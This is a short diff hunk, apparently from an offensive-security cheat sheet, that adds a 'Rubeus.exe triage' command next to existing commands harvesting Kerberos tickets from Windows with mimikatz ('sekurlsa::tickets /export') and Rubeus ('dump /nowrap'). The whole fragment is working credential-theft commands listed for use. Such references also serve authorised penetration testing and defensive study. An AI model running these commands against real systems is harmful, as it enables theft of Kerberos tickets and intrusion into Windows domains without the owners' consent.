@@ -1441,6 +1441,9 @@ klist
 # Harvesting Kerberos tickets from Windows by mimikatz ( it wil export ticket to file .kirbi ) 
 mimikatz.exe privilege::debug "sekurlsa::tickets /export" exit
 
+# View all tickets that the current session is accessible for.
+Rubeus.exe triage
+
 # Harvesting Kerberos tickets from Windows by Rubeus   ( it wil export ticket to file .kirbi )
 Rubeus.exe dump /nowrap
 
